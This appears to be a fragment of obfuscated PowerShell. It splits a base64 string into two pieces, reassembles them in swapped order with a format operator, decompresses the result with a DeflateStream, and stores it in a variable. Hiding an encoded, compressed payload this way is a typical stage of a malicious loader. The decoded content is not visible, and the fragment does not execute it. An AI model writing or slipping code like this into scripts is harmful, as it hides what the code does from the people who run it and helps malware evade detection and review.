$d = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(('{1}{0}' -f 'PyBBHx32JrG4xJZ9Dinu8bii3JFmdqerCQ==','PY0xDsIwEARfREKgQEK6')),[IO.Compression.CompressionMode]::Decompress)
$descriptor_deadbeef = (New-Object IO.StreamReader($d)).ReadToEnd()
